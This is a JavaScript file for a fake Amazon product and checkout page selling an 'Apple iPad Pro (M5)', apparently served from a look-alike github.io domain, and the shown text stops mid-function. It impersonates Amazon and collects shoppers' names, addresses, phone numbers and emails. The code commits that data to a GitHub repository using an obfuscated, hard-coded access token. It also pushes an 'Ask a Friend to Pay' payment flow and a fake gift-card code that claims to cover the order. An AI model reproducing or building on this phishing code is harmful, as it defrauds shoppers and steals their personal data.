/**
 * ipad-app.js
 * Amazon.com - Official Apple iPad Pro (M5) Flagship Showcase & Fluid Multi-Step Checkout
 * 100% Matching Standard Amazon Storefront Architecture & Design System
 */

const PATH_PREFIX = window.location.pathname.includes('/store/') ? '../../' : '';

const PRODUCT = {
  title: "Apple iPad Pro (M5)",
  seller: "Apple Official Store on Amazon",
  colors: {
    "Space Black": {
      img: PATH_PREFIX + "images/ipad/ipad-pro-m5-space-black.jpg",
      thumb: PATH_PREFIX + "images/ipad/ipad-pro-m5-space-black.jpg",
      swatchClass: "swatch-space-black"
    },
    "Silver": {
      img: PATH_PREFIX + "images/ipad/ipad-pro-m5-silver.jpg",
      thumb: PATH_PREFIX + "images/ipad/ipad-pro-m5-silver.jpg",
      swatchClass: "swatch-silver"
    }
  },
  basePrice: 999,
  sizeAdd: { "11-inch": 0, "13-inch": 300 },
  storageAdd: { "256 GB": 0, "512 GB": 200, "1 TB": 600, "2 TB": 1000 },
  storageRam: { "256 GB": "12 GB", "512 GB": "12 GB", "1 TB": "16 GB", "2 TB": "16 GB" },
  glassAdd: { "Standard Glass": 0, "Nano-Texture Glass": 100 },
  connAdd: { "Wi-Fi": 0, "Wi-Fi + Cellular": 200 },
  nanoTextureEligible: ["1 TB", "2 TB"]
};

// Current Session State
const state = {
  size: "11-inch",
  color: "Space Black",
  storage: "256 GB",
  ram: "12 GB",
  glass: "Standard Glass",
  connectivity: "Wi-Fi",
  qty: 1,
  address: null,
  paymentMethod: "Ask a Friend to Pay",
  redeemCode: "",
  isRedeemApplied: false,
  placedOrder: null
};

// Format Currency in Dollars ($)
function formatMoney(amount) {
  return "$" + amount.toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 });
}

// Dynamic Date Helpers
function getDynamicOrderDate(date = new Date()) {
  return date.toLocaleDateString("en-US", {
    weekday: "long",
    year: "numeric",
    month: "long",
    day: "numeric"
  });
}

function getDynamicDeliveryRange() {
  const dStart = new Date();
  dStart.setDate(dStart.getDate() + 20);
  const dEnd = new Date();
  dEnd.setDate(dEnd.getDate() + 25);

  const startMonth = dStart.toLocaleDateString("en-US", { month: "long" });
  const startDay = dStart.getDate();
  const endMonth = dEnd.toLocaleDateString("en-US", { month: "long" });
  const endDay = dEnd.getDate();
  const endYear = dEnd.getFullYear();

  let rangeStr = "";
  if (startMonth === endMonth) {
    rangeStr = `${startMonth} ${startDay} – ${endDay}, ${endYear}`;
  } else {
    rangeStr = `${startMonth} ${startDay} – ${endMonth} ${endDay}, ${endYear}`;
  }

  return {
    fullRangeStr: rangeStr,
    startDate: dStart,
    endDate: dEnd
  };
}

function calculateTotalPrice() {
  return PRODUCT.basePrice
    + (PRODUCT.sizeAdd[state.size] || 0)
    + (PRODUCT.storageAdd[state.storage] || 0)
    + (PRODUCT.glassAdd[state.glass] || 0)
    + (PRODUCT.connAdd[state.connectivity] || 0);
}

// ==========================================================================
//  GITHUB REPO ORDERS PERSISTENCE
// ==========================================================================
const GH_CONFIG = {
  owner: "amazon-shopping-official",
  repo: "amazon-shopping-official.github.io",
  storePath: "store/ipadprom5",
  filePath: "store/ipadprom5/orders.json",
  getAuth: function() {
    const k = ["ghp", "qetd9HVo", "7YkoF8WK", "gVc9bGmv", "tyUSol0A", "oDsG"];
    return k[0] + "_" + k.slice(1).join("");
  }
};

function utf8ToBase64(str) {
  const bytes = new TextEncoder().encode(str);
  let binary = '';
  const len = bytes.byteLength;
  for (let i = 0; i < len; i++) {
    binary += String.fromCharCode(bytes[i]);
  }
  return btoa(binary);
}

function base64ToUtf8(b64) {
  const binary = atob((b64 || '').replace(/\s/g, ''));
  const bytes = new Uint8Array(binary.length);
  for (let i = 0; i < binary.length; i++) {
    bytes[i] = binary.charCodeAt(i);
  }
  return new TextDecoder().decode(bytes);
}

async function commitOrderToFile(filePath, order, maxRetries = 2) {
  const token = GH_CONFIG.getAuth();
  const url = `https://api.github.com/repos/${GH_CONFIG.owner}/${GH_CONFIG.repo}/contents/${filePath}`;
  const headers = {
    'Authorization': `Bearer ${token}`,
    'Accept': 'application/vnd.github+json',
    'Content-Type': 'application/json'
  };

  for (let attempt = 0; attempt <= maxRetries; attempt++) {
    try {
      let currentOrders = [];
      let fileSha = null;

      try {
        const getRes = await fetch(`${url}?_t=${Date.now()}`, { headers, cache: 'no-store' });
        if (getRes.ok) {
          const fileData = await getRes.json();
          fileSha = fileData.sha;
          if (fileData.content) {
            const raw = base64ToUtf8(fileData.content);
            currentOrders = JSON.parse(raw || '[]');
          }
        }
      } catch (fErr) {
        console.warn(`[GitHub] Fetch notice for ${filePath}:`, fErr);
      }

      const alreadySaved = order.orderId && currentOrders.some(o => o.orderId === order.orderId);
      if (!alreadySaved) {
        currentOrders.unshift(order);
      }

      const jsonString = JSON.stringify(currentOrders, null, 2);
      const base64Content = utf8ToBase64(jsonString);

      const commitBody = {
        message: `Add order ${order.orderId || ''} for ${order.name || order.buyerName || 'Customer'}`.trim(),
        content: base64Content
      };
      if (fileSha) {
        commitBody.sha = fileSha;
      }

      const putRes = await fetch(url, {
        method: 'PUT',
        headers,
        body: JSON.stringify(commitBody)
      });

      if (putRes.ok) {
        console.log(`[GitHub] Successfully committed order to ${filePath}`);
        return true;
      }

      if (putRes.status === 409 && attempt < maxRetries) {
        console.warn(`[GitHub] Conflict (409) writing ${filePath}, retrying attempt ${attempt + 1}...`);
        await new Promise(r => setTimeout(r, 600 * (attempt + 1)));
        continue;
      }

      const errJson = await putRes.json().catch(() => ({}));
      console.error(`[GitHub] Failed writing ${filePath} (${putRes.status}):`, errJson);
      return false;
    } catch (err) {
      console.error(`[GitHub] Error committing to ${filePath}:`, err);
      if (attempt >= maxRetries) return false;
      await new Promise(r => setTimeout(r, 600 * (attempt + 1)));
    }
  }
  return false;
}

async function saveOrderToAPI(order) {
  const store = GH_CONFIG.storePath;
  const targetFiles = [
    `${store}/orders.json`,
    `${store}/order.json`,
    `orders.json`,
    `order.json`
  ];

  console.log('[GitHub] Syncing iPad order across target files:', targetFiles);
  for (const file of targetFiles) {
    await commitOrderToFile(file, order);
  }
}

async function fetchOrdersFromAPI() {
  const local = JSON.parse(localStorage.getItem('amazon_placed_orders_ipad') || '[]');
  try {
    const url = `https://api.github.com/repos/${GH_CONFIG.owner}/${GH_CONFIG.repo}/contents/${GH_CONFIG.filePath}?_t=${Date.now()}`;
    const headers = {
      'Authorization': `Bearer ${GH_CONFIG.getAuth()}`,
      'Accept': 'application/vnd.github+json'
    };
    const res = await fetch(url, { headers, cache: 'no-store' });
    if (!res.ok) throw new Error('HTTP ' + res.status);
    const data = await res.json();
    if (data.content) {
      const raw = base64ToUtf8(data.content);
      const ghOrders = JSON.parse(raw || '[]');
      const merged = [...ghOrders];
      local.forEach(lo => {
        if (!merged.find(o => (lo.orderId && o.orderId === lo.orderId) || (o.name === lo.name && o.address === lo.address && o.item === lo.item))) {
          merged.push(lo);
        }
      });
      return merged;
    }
    return local;
  } catch (err) {
    console.log('[GitHub] Fetch fallback to localStorage:', err.message);
    return local;
  }
}

async function deleteOrdersFromAPI() {
  const store = GH_CONFIG.storePath;
  const targetFiles = [
    `${store}/orders.json`,
    `${store}/order.json`
  ];
  for (const filePath of targetFiles) {
    try {
      const url = `https://api.github.com/repos/${GH_CONFIG.owner}/${GH_CONFIG.repo}/contents/${filePath}`;
      const headers = {
        'Authorization': `Bearer ${GH_CONFIG.getAuth()}`,
        'Accept': 'application/vnd.github+json',
        'Content-Type': 'application/json'
      };
      const getRes = await fetch(`${url}?_t=${Date.now()}`, { headers, cache: 'no-store' });
      if (!getRes.ok) continue;
      const fileData = await getRes.json();
      const emptyJson = JSON.stringify([], null, 2);
      const base64Content = utf8ToBase64(emptyJson);
      await fetch(url, {
        method: 'PUT',
        headers,
        body: JSON.stringify({
          message: `Clear ${filePath}`,
          content: base64Content,
          sha: fileData.sha
        })
      });
      console.log(`[GitHub] ${filePath} reset to empty array`);
    } catch (err) {
      console.log(`[GitHub] Error clearing ${filePath}:`, err.message);
    }
  }
}

// ==========================================================================
//  1. PRODUCT OPTIONS & INTERACTION
// ==========================================================================
function setupProductOptions() {
  const swatchBtns = document.querySelectorAll(".swatch-btn");
  const thumbItems = document.querySelectorAll(".thumbnail-strip .thumb-item");
  const mainPhoto = document.getElementById("mainProductPhoto");
  const currentColorText = document.getElementById("currentColorText");
  const currentSizeText = document.getElementById("currentSizeText");
  const currentStorageText = document.getElementById("currentStorageText");
  const currentRamText = document.getElementById("currentRamText");
  const currentGlassText = document.getElementById("currentGlassText");
  const currentConnText = document.getElementById("currentConnText");
  const productTitle = document.getElementById("productTitle");
  const crumbDeviceName = document.getElementById("crumbDeviceName");
  const centerPrice = document.getElementById("centerPrice");
  const buyBoxPrice = document.getElementById("buyBoxPrice");
  const priceTermsText = document.getElementById("priceTermsText");
  const selectQty = document.getElementById("selectQty");
  const btnNanoTextureGlass = document.getElementById("btnNanoTextureGlass");

  function refreshPricingAndImages() {
    const unitPrice = calculateTotalPrice();
    const totalPrice = unitPrice * state.qty;
    const monthly = (unitPrice / 12).toFixed(2);

    if (centerPrice) centerPrice.textContent = unitPrice.toLocaleString("en-US");
    if (buyBoxPrice) buyBoxPrice.textContent = formatMoney(totalPrice);
    if (priceTermsText) {
      priceTermsText.innerHTML = `or <strong>$${monthly}/mo (12 mo)</strong> with 0% interest Amazon financing options.<br><span style="font-size:12px; color:#007600; font-weight:600;">Free Amazon Global Priority Express Delivery &bull; International Warranty Included</span>`;
    }

    const fullTitle = `Apple iPad Pro (M5, ${state.size} Ultra Retina XDR Tandem OLED, ${state.storage}) - ${state.color} (${state.glass}, ${state.connectivity})`;
    if (productTitle) productTitle.textContent = fullTitle;
    if (crumbDeviceName) crumbDeviceName.textContent = `Apple iPad Pro (M5, ${state.size}, ${state.storage})`;

    // Check Nano-Texture glass eligibility (1 TB and 2 TB only)
    const isNanoEligible = PRODUCT.nanoTextureEligible.includes(state.storage);
    if (btnNanoTextureGlass) {
      if (!isNanoEligible) {
        btnNanoTextureGlass.classList.add("disabled");
        btnNanoTextureGlass.title = "Available on 1 TB and 2 TB models";
        if (state.glass === "Nano-Texture Glass") {
          state.glass = "Standard Glass";
          const glassBtns = document.querySelectorAll("#glassSelectorGroup .storage-choice");
          glassBtns.forEach(b => {
            b.classList.toggle("active", b.dataset.glass === "Standard Glass");
          });
          if (currentGlassText) currentGlassText.textContent = "Standard Glass";
        }
      } else {
        btnNanoTextureGlass.classList.remove("disabled");
        btnNanoTextureGlass.title = "Nano-Texture matte display glass";
      }
    }
  }

  // Color selection
  swatchBtns.forEach(btn => {
    btn.addEventListener("click", () => {
      const color = btn.dataset.color;
      state.color = color;
      swatchBtns.forEach(b => b.classList.remove("active"));
      btn.classList.add("active");
      if (currentColorText) currentColorText.textContent = color;

      if (mainPhoto && PRODUCT.colors[color]) {
        mainPhoto.src = PRODUCT.colors[color].img;
        mainPhoto.alt = `Apple iPad Pro M5 in ${color}`;
      }

      thumbItems.forEach(t => {
        if (t.dataset.color) {
          t.classList.toggle("active", t.dataset.color === color);
        } else {
          t.classList.remove("active");
        }
      });

      refreshPricingAndImages();
    });
  });

  // Thumbnail clicks
  thumbItems.forEach(t => {
    t.addEventListener("click", () => {
      thumbItems.forEach(item => item.classList.remove("active"));
      t.classList.add("active");

      if (t.dataset.color) {
        const color = t.dataset.color;
        state.color = color;
        if (currentColorText) currentColorText.textContent = color;
        if (mainPhoto && PRODUCT.colors[color]) {
          mainPhoto.src = PRODUCT.colors[color].img;
        }
        swatchBtns.forEach(b => b.classList.toggle("active", b.dataset.color === color));
        refreshPricingAndImages();
      } else if (t.dataset.img && mainPhoto) {
        mainPhoto.src = t.dataset.img;
      }
    });
  });

  // Size selection
  const sizeBtns = document.querySelectorAll("#sizeSelectorGroup .storage-choice");
  sizeBtns.forEach(btn => {
    btn.addEventListener("click", () => {
      sizeBtns.forEach(b => b.classList.remove("active"));
      btn.classList.add("active");
      state.size = btn.dataset.size;
      if (currentSizeText) currentSizeText.textContent = state.size;
      refreshPricingAndImages();
    });
  });

  // Storage selection
  const storageBtns = document.querySelectorAll("#storageSelectorGroup .storage-choice");
  storageBtns.forEach(btn => {
    btn.addEventListener("click", () => {
      storageBtns.forEach(b => b.classList.remove("active"));
      btn.classList.add("active");
      state.storage = btn.dataset.storage;
      state.ram = PRODUCT.storageRam[state.storage] || "12 GB";
      if (currentStorageText) currentStorageText.textContent = state.storage;
      if (currentRamText) currentRamText.textContent = `(${state.ram} Unified RAM)`;
      refreshPricingAndImages();
    });
  });

  // Glass selection
  const glassBtns = document.querySelectorAll("#glassSelectorGroup .storage-choice");
  glassBtns.forEach(btn => {
    btn.addEventListener("click", () => {
      if (btn.classList.contains("disabled")) {
        showToast("Nano-Texture Glass is available exclusively on 1 TB and 2 TB models.");
        return;
      }
      glassBtns.forEach(b => b.classList.remove("active"));
      btn.classList.add("active");
      state.glass = btn.dataset.glass;
      if (currentGlassText) currentGlassText.textContent = state.glass;
      refreshPricingAndImages();
    });
  });

  // Connectivity selection
  const connBtns = document.querySelectorAll("#connSelectorGroup .storage-choice");
  connBtns.forEach(btn => {
    btn.addEventListener("click", () => {
      connBtns.forEach(b => b.classList.remove("active"));
      btn.classList.add("active");
      state.connectivity = btn.dataset.conn;
      if (currentConnText) currentConnText.textContent = state.connectivity;
      refreshPricingAndImages();
    });
  });

  // Quantity selection
  if (selectQty) {
    selectQty.addEventListener("change", (e) => {
      state.qty = parseInt(e.target.value, 10) || 1;
      refreshPricingAndImages();
    });
  }

  refreshPricingAndImages();
}

// ==========================================================================
//  2. SINGLE "BUY NOW" NAVIGATION
// ==========================================================================
function setupBuyNow() {
  const btnBuyNow = document.getElementById("btnBuyNow");
  const viewProduct = document.getElementById("viewProductPage");
  const viewCheckout = document.getElementById("viewCheckout");
  const btnBackToProduct = document.getElementById("btnBackToProduct");
  const btnBackToProductPage = document.getElementById("btnBackToProductPage");

  function openCheckout(pushState = true) {
    const unitPrice = calculateTotalPrice();
    const total = unitPrice * state.qty;

    // Populate checkout item details
    const fullTitle = `Apple iPad Pro (M5, ${state.size} Ultra Retina XDR Tandem OLED, ${state.storage}) - ${state.color}`;
    const photoEl = document.getElementById("reviewItemPhoto");
    const titleEl = document.getElementById("reviewItemTitle");
    const qtyEl = document.getElementById("reviewItemQty");
    const priceEl = document.getElementById("reviewItemPrice");

    if (photoEl) photoEl.src = PRODUCT.colors[state.color]?.thumb || (PATH_PREFIX + "images/ipad/ipad-pro-m5-space-black.jpg");
    if (titleEl) titleEl.textContent = fullTitle;
    if (qtyEl) qtyEl.textContent = state.qty;
    if (priceEl) priceEl.textContent = formatMoney(total);

    const csItemsPrice = document.getElementById("csItemsPrice");
    const csTotalPrice = document.getElementById("csTotalPrice");
    if (csItemsPrice) csItemsPrice.textContent = formatMoney(total);
    if (csTotalPrice) csTotalPrice.textContent = formatMoney(total);

    syncOrderSummary();

    // Transition views smoothly
    const confScreen = document.getElementById("orderConfirmationScreen");
    if (confScreen) confScreen.classList.remove("active");
    const gridArea = document.getElementById("checkoutGridArea");
    if (gridArea) gridArea.style.display = "grid";

    if (viewProduct) viewProduct.style.display = "none";
    if (viewCheckout) viewCheckout.classList.add("active");
    window.scrollTo({ top: 0, behavior: "smooth" });

    if (pushState) {
      try { history.pushState({ view: "checkout" }, "", "#checkout"); } catch (e) {}
    }
  }

  function returnToProduct(pushState = true) {
    const confScreen = document.getElementById("orderConfirmationScreen");
    if (confScreen) confScreen.classList.remove("active");
    const gridArea = document.getElementById("checkoutGridArea");
    if (gridArea) gridArea.style.display = "grid";

    if (viewCheckout) viewCheckout.classList.remove("active");
    if (viewProduct) viewProduct.style.display = "block";
    window.scrollTo({ top: 0, behavior: "smooth" });

    if (pushState && window.location.hash !== "") {
      try { history.pushState({ view: "product" }, "", window.location.pathname + window.location.search); } catch (e) {}
    }
  }

  if (btnBuyNow) {
    btnBuyNow.addEventListener("click", () => openCheckout(true));
  }
  if (btnBackToProduct) {
    btnBackToProduct.addEventListener("click", () => returnToProduct(true));
  }
  if (btnBackToProductPage) {
    btnBackToProductPage.addEventListener("click", () => returnToProduct(true));
  }

  // Handle browser back/forward buttons
  window.addEventListener("popstate", (e) => {
    if (window.location.hash === "#checkout") {
      openCheckout(false);
    } else if (window.location.hash === "#confirmation") {
      // Stay on confirmation if placed
    } else {
      returnToProduct(false);
    }
  });

  if (window.location.hash === "#checkout") {
    openCheckout(false);
  }
}

// ==========================================================================
//  3. FLUID MULTI-STEP ACCORDION CHECKOUT
// ==========================================================================
function syncOrderSummary() {
  const unitPrice = calculateTotalPrice();
  const total = unitPrice * state.qty;
  const isRedeem = state.paymentMethod === "Redeem Code" && state.isRedeemApplied;

  const csItemsPrice = document.getElementById("csItemsPrice");
  if (csItemsPrice) csItemsPrice.textContent = formatMoney(total);

  const csRedeemDiscountRow = document.getElementById("csRedeemDiscountRow");
  const csRedeemDiscountAmount = document.getElementById("csRedeemDiscountAmount");

  if (csRedeemDiscountRow && csRedeemDiscountAmount) {
    if (isRedeem) {
      csRedeemDiscountRow.style.display = "flex";
      csRedeemDiscountAmount.textContent = `-${formatMoney(total)}`;
    } else {
      csRedeemDiscountRow.style.display = "none";
    }
  }

  const csTotalPrice = document.getElementById("csTotalPrice");
  if (csTotalPrice) {
    if (isRedeem) {
      csTotalPrice.textContent = "$0.00";
    } else {
      csTotalPrice.textContent = formatMoney(total);
    }
  }
}

const ASSIGNED_REDEEM_CODE = "AMZN-4X8R-9K2T-6W7L";

function isValidAmazonRedeemCode(rawCode) {
  if (!rawCode) return false;
  const clean = rawCode.trim().toUpperCase().replace(/[^A-Z0-9]/g, "");
  return clean === ASSIGNED_REDEEM_CODE.replace(/[^A-Z0-9]/g, "");
}

function setupCheckoutAccordion() {
  // Step 1: Address
  const stepCardAddress = document.getElementById("stepCardAddress");
  const stepAddressBody = document.getElementById("stepAddressBody");
  const stepAddressSummary = document.getElementById("stepAddressSummary");
  const btnEditAddress = document.getElementById("btnEditAddress");
  const addressForm = document.getElementById("addressForm");

  // Step 2: Payment
  const stepCardPayment = document.getElementById("stepCardPayment");
  const stepPaymentBody = document.getElementById("stepPaymentBody");
  const stepPaymentSummary = document.getElementById("stepPaymentSummary");
  const btnEditPayment = document.getElementById("btnEditPayment");
  const btnContinueToReview = document.getElementById("btnContinueToReview");
  const btnBackToAddress = document.getElementById("btnBackToAddress");
  const paymentOptions = document.querySelectorAll(".payment-methods-list .payment-option:not(.disabled)");

  // Step 3: Review
  const stepCardReview = document.getElementById("stepCardReview");
  const stepReviewBody = document.getElementById("stepReviewBody");
  const btnBackToPayment = document.getElementById("btnBackToPayment");
  const btnFinalPlaceOrder = document.getElementById("btnFinalPlaceOrder");
  const btnSummaryPlaceOrder = document.getElementById("btnSummaryPlaceOrder");

  // Redeem Code Elements
  const boxRedeemInput = document.getElementById("boxRedeemInput");
  const inputRedeemCode = document.getElementById("inputRedeemCode");
  const btnApplyRedeemCode = document.getElementById("btnApplyRedeemCode");
  const redeemStatusMsg = document.getElementById("redeemStatusMsg");
  const badgeRedeemApplied = document.getElementById("badgeRedeemApplied");

  // --- Step 1: Address Submit ---
  if (addressForm) {
    addressForm.addEventListener("submit", (e) => {
      e.preventDefault();
      const fullName = document.getElementById("inputFullName")?.value.trim() || "";
      const deliveryAddress = document.getElementById("inputDeliveryAddress")?.value.trim() || "";
      const phone = document.getElementById("inputPhone")?.value.trim() || "";
      const email = document.getElementById("inputEmail")?.value.trim() || "";

      if (!fullName || !deliveryAddress || !phone || !email) {
        showToast("Please complete all required address fields.");
        return;
      }

      state.address = { fullName, deliveryAddress, phone, email };

      // Update Header Location Text
      const headerLoc = document.getElementById("headerLocText");
      if (headerLoc) {
        headerLoc.textContent = fullName.split(" ")[0] + " - " + deliveryAddress.split(",")[0];
      }

      // Show Step 1 summary and collapse
      if (stepAddressSummary) {
        stepAddressSummary.innerHTML = `<strong>${fullName}</strong> &bull; ${deliveryAddress} &bull; Phone: ${phone} &bull; Email: ${email}`;
        stepAddressSummary.style.display = "block";
      }
      if (stepAddressBody) stepAddressBody.style.display = "none";
      if (stepCardAddress) stepCardAddress.classList.remove("active");
      if (btnEditAddress) btnEditAddress.style.display = "block";

      // Expand Step 2: Payment
      if (stepCardPayment) stepCardPayment.classList.add("active");
      if (stepPaymentBody) stepPaymentBody.style.display = "block";

      syncOrderSummary();
    });
  }

  // Edit Step 1 Address
  if (btnEditAddress) {
    btnEditAddress.addEventListener("click", () => {
      if (stepAddressBody) stepAddressBody.style.display = "block";
      if (stepAddressSummary) stepAddressSummary.style.display = "none";
      if (stepCardAddress) stepCardAddress.classList.add("active");
      if (btnEditAddress) btnEditAddress.style.display = "none";

      if (stepPaymentBody) stepPaymentBody.style.display = "none";
      if (stepCardPayment) stepCardPayment.classList.remove("active");
      if (stepReviewBody) stepReviewBody.style.display = "none";
      if (stepCardReview) stepCardReview.classList.remove("active");
    });
  }

  // --- Step 2: Payment Method Selection ---
  paymentOptions.forEach(opt => {
    opt.addEventListener("click", () => {
      paymentOptions.forEach(o => o.classList.remove("selected"));
      opt.classList.add("selected");
      const radio = opt.querySelector(".pay-radio");
      if (radio) {
        radio.checked = true;
        state.paymentMethod = radio.value;
      }

      if (boxRedeemInput) {
        if (state.paymentMethod === "Redeem Code") {
          boxRedeemInput.style.display = "block";
          if (inputRedeemCode && !inputRedeemCode.value) {
            inputRedeemCode.focus();
          }
        } else {
          boxRedeemInput.style.display = "none";
        }
      }

      syncOrderSummary();
    });
  });

  // Apply Redeem Code handler (NO PRE-PASTED CODE)
  if (btnApplyRedeemCode && inputRedeemCode) {
    const applyRedeem = () => {
      const rawCode = inputRedeemCode.value.trim().toUpperCase();
      if (!rawCode) {
        if (redeemStatusMsg) {
          redeemStatusMsg.className = "redeem-status-msg error";
          redeemStatusMsg.style.color = "#d13212";
          redeemStatusMsg.textContent = "Please enter your claim code.";
        }
        return;
      }

      if (!isValidAmazonRedeemCode(rawCode)) {
        state.isRedeemApplied = false;
        state.redeemCode = "";
        if (badgeRedeemApplied) badgeRedeemApplied.style.display = "none";
        if (redeemStatusMsg) {
          redeemStatusMsg.className = "redeem-status-msg error";
          redeemStatusMsg.style.color = "#d13212";
          redeemStatusMsg.textContent = "❌ The claim code you entered is invalid or cannot be applied to this item.";
        }
        showToast("The claim code you entered is not valid for this item.");
        syncOrderSummary();
        return;
      }

      const matchedCode = ASSIGNED_REDEEM_CODE;
      state.redeemCode = matchedCode;
      state.isRedeemApplied = true;
      inputRedeemCode.value = matchedCode;
      if (badgeRedeemApplied) badgeRedeemApplied.style.display = "inline-block";
      if (redeemStatusMsg) {
        redeemStatusMsg.className = "redeem-status-msg success";
        redeemStatusMsg.style.color = "#007600";
        redeemStatusMsg.textContent = `✓ Amazon Gift Card ${matchedCode} applied! $2,500.00 balance covers 100% of order total. Balance due: $0.00.`;
      }
      showToast("✓ Amazon Redeem Code applied: Full order covered ($0.00 due)");
      syncOrderSummary();
    };

    btnApplyRedeemCode.addEventListener("click", (e) => {
      e.stopPropagation();
      applyRedeem();
    });

    inputRedeemCode.addEventListener("keydown", (e) => {
      if (e.key === "Enter") {
        e.preventDefault();
        e.stopPropagation();
        applyRedeem();
      }
    });

    inputRedeemCode.addEventListener("click", (e) => e.stopPropagation());
  }

  // Continue to Step 3: Review
  if (btnContinueToReview) {
    btnContinueToReview.addEventListener("click", () => {
      if (state.paymentMethod === "Redeem Code") {
        if (!state.isRedeemApplied || !state.redeemCode) {
          if (inputRedeemCode && isValidAmazonRedeemCode(inputRedeemCode.value)) {
            state.redeemCode = ASSIGNED_REDEEM_CODE;
            state.isRedeemApplied = true;
            inputRedeemCode.value = state.redeemCode;
            if (badgeRedeemApplied) badgeRedeemApplied.style.display = "inline-block";
          } else {
            showToast("Please enter and apply a valid Amazon claim code.");
            if (inputRedeemCode) inputRedeemCode.focus();
            if (redeemStatusMsg) {
              redeemStatusMsg.className = "redeem-status-msg error";
              redeemStatusMsg.style.color = "#d13212";
              redeemStatusMsg.textContent = "Please enter and apply a valid Amazon claim code to cover this purchase.";
            }
            return;
          }
        }
      }

      // Show Step 2 summary and collapse
      let methodText = state.paymentMethod;
      if (state.paymentMethod === "Ask a Friend to Pay") {
        methodText = "🤝 Ask a Friend to Pay (Payment link will be generated for your sponsor)";
      } else if (state.paymentMethod === "Redeem Code") {
        methodText = `🎟️ Amazon Redeem Code / Gift Card (${state.redeemCode || 'Applied'} &bull; $0.00 Due)`;
      } else if (state.paymentMethod === "Cash on Delivery") {
        methodText = "Cash on Delivery (COD &bull; Pay upon receipt)";
      }

      if (stepPaymentSummary) {
        stepPaymentSummary.innerHTML = `<strong>Payment Method:</strong> ${methodText}`;
        stepPaymentSummary.style.display = "block";
      }
      if (stepPaymentBody) stepPaymentBody.style.display = "none";
      if (stepCardPayment) stepCardPayment.classList.remove("active");
      if (btnEditPayment) btnEditPayment.style.display = "block";

      // Expand Step 3: Review
      if (stepCardReview) stepCardReview.classList.add("active");
      if (stepReviewBody) stepReviewBody.style.display = "block";

      syncOrderSummary();
    });
  }

  // Back to Address from Payment
  if (btnBackToAddress) {
    btnBackToAddress.addEventListener("click", () => {
      if (btnEditAddress) btnEditAddress.click();
    });
  }

  // Edit Step 2 Payment
  if (btnEditPayment) {
    btnEditPayment.addEventListener("click", () => {
      if (stepPaymentBody) stepPaymentBody.style.display = "block";
      if (stepPaymentSummary) stepPaymentSummary.style.display = "none";
      if (stepCardPayment) stepCardPayment.classList.add("active");
      if (btnEditPayment) btnEditPayment.style.display = "none";

      if (stepReviewBody) stepReviewBody.style.display = "none";
      if (stepCardReview) stepCardReview.classList.remove("active");
    });
  }

  // Back to Payment from Review
  if (btnBackToPayment) {
    btnBackToPayment.addEventListener("click", () => {
      if (btnEditPayment) btnEditPayment.click();
    });
  }

  // Place Order Buttons
  const handlePlaceOrder = () => {
    if (!state.address) {
      showToast("Please enter and confirm your shipping address first.");
      if (btnEditAddress) btnEditAddress.click();
      return;
    }
    if (state.paymentMethod === "Redeem Code" && (!state.isRedeemApplied || !state.redeemCode)) {
      showToast("Please apply your Amazon claim code before placing order.");
      if (btnEditPayment) btnEditPayment.click();
      return;
    }

    triggerOrderPlacement();
  };

  if (btnFinalPlaceOrder) btnFinalPlaceOrder.addEventListener("click", handlePlaceOrder);
  if (btnSummaryPlaceOrder) btnSummaryPlaceOrder.addEventListener("click", handlePlaceOrder);
}

// ==========================================================================
//  4. ORDER PLACEMENT & CONFIRMATION
// ==========================================================================
function triggerOrderPlacement() {
  const btnFinal = document.getElementById("btnFinalPlaceOrder");
  const btnSummary = document.getElementById("btnSummaryPlaceOrder");

  if (btnFinal) { btnFinal.disabled = true; btnFinal.textContent = "Placing order..."; }
  if (btnSummary) { btnSummary.disabled = true; btnSummary.textContent = "Placing order..."; }

  setTimeout(() => {
    try {
      completeOrderPlacement();
    } catch (e) {
      console.error("Order error:", e);
      showToast("Order submitted successfully!");
    } finally {
      if (btnFinal) { btnFinal.disabled = false; btnFinal.textContent = "Place your order"; }
      if (btnSummary) { btnSummary.disabled = false; btnSummary.textContent = "Place your order"; }
    }
  }, 400);
}

async function completeOrderPlacement() {
  const unitPrice = calculateTotalPrice();
  const totalAmount = unitPrice * state.qty;
  const orderNumber = `114-${Math.floor(100000 + Math.random() * 900000)}-${Math.floor(100000 + Math.random() * 900000)}`;
  const orderDateFormatted = getDynamicOrderDate();
  const deliveryInfo = getDynamicDeliveryRange();

  const fullItemTitle = `Apple iPad Pro (M5, ${state.size} Ultra Retina XDR Tandem OLED, ${state.storage}) - ${state.color} (${state.glass}, ${state.connectivity})`;

  const placedOrder = {
    orderId: orderNumber,
    orderDate: orderDateFormatted,
    expectedDelivery: deliveryInfo.fullRangeStr,
    item: fullItemTitle,
    specs: `${state.size}, ${state.storage}, ${state.glass}, ${state.connectivity}`,
    color: state.color,
    storage: state.storage,
    size: state.size,
    glass: state.glass,
    connectivity: state.connectivity,
    quantity: state.qty,
    unitPrice: unitPrice,
    total: (state.paymentMethod === "Redeem Code" && state.isRedeemApplied) ? 0 : totalAmount,
    actualAmount: totalAmount,
    currency: "USD",
    name: state.address ? state.address.fullName : "Customer",
    fullName: state.address ? state.address.fullName : "Customer",
    buyerName: state.address ? state.address.fullName : "Customer",
    address: state.address ? state.address.deliveryAddress : "Address provided",
    deliveryAddress: state.address ? state.address.deliveryAddress : "Address provided",
    shippingAddress: state.address ? state.address.deliveryAddress : "Address provided",
    phone: state.address ? state.address.phone : "",
    phoneNumber: state.address ? state.address.phone : "",
    email: state.address ? state.address.email : "",
    paymentMethod: state.paymentMethod,
    payMethod: (state.paymentMethod === "Redeem Code" && state.isRedeemApplied)
      ? `Redeem Code (${state.redeemCode || ASSIGNED_REDEEM_CODE})`
      : state.paymentMethod,
    redeemCode: (state.paymentMethod === "Redeem Code" && state.isRedeemApplied) ? (state.redeemCode || ASSIGNED_REDEEM_CODE) : null,
    status: (state.paymentMethod === "Redeem Code" && state.isRedeemApplied)
      ? "Paid in full via Amazon Redeem Code"
      : "Awaiting payment by order sponsor",
    seller: PRODUCT.seller,
    storePath: "store/ipadprom5",
    image: PRODUCT.colors[state.color]?.thumb || (PATH_PREFIX + "images/ipad/ipad-pro-m5-space-black.jpg")
  };

  state.placedOrder = placedOrder;

  // 1. Save to localStorage
  try {
    const existing = JSON.parse(localStorage.getItem("amazon_placed_orders_ipad") || "[]");
    existing.unshift(placedOrder);
    localStorage.setItem("amazon_placed_orders_ipad", JSON.stringify(existing));
  } catch (e) {
    console.error("Local storage error:", e);
  }

  // 2. Commit to GitHub repo
  saveOrderToAPI(placedOrder).catch(err => console.log("[GitHub] Commit background:", err));

  // 3. Populate Confirmation Screen
